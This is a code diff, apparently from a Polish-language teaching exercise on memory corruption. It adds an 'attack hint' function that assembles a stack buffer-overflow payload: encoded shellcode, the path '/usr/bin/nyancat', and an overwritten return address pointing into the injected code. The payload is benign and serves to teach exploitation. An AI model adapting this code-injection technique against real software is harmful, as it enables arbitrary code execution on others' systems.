@@ -83,3 +83,36 @@ void zamien_bajt_pamieci_zmieniajac_uprawnienia_dostepu(long long adres, char wa
 
 	return;
 }
+
+void podpowiedz_do_ataku(void* adr) {
+	//wypisz(adres_na_liczbe(adr));
+	//wypisz_pamiec_w_long_longach(adr, 20);
+	//wypisz_pamiec_w_bajtach((void*) zla_funkcja_2, 40);
+	//wypisz_pamiec_w_long_longach((void*) zla_funkcja_2, 10);
+	//res[7] = (long long) &zla_funkcja_2;
+
+	long long res[20] = {0};
+	char str[30] = "/usr/bin/nyancat";
+	long long *tab = (long long*) str;
+
+	// Te trzy komórki zawierają adres do programu `nyancat`
+	res[0] = tab[0];
+	res[1] = tab[1];
+	res[2] = tab[2];
+
+	// Te komórki wpisują na stos fragment kodu, który ma go uruchomić :)
+	res[8] = 5188146771733301064;
+	res[9] = 55951160663899277;
+	res[10] = 214161162240000; 
+	res[11] = -936747884889571328;
+
+	// Adres powrotu ustawiamy na wpisany stworzony nas powyżej kod
+	res[7] = (long long) adr + 64; 
+
+	int n = 12;
+	cout << "Podaj dane: " << '\n';
+	cout << n << '\n';
+	for(int i = 0; i < n; i++)
+		cout << res[i] << " ";
+	cout << '\n';
+}
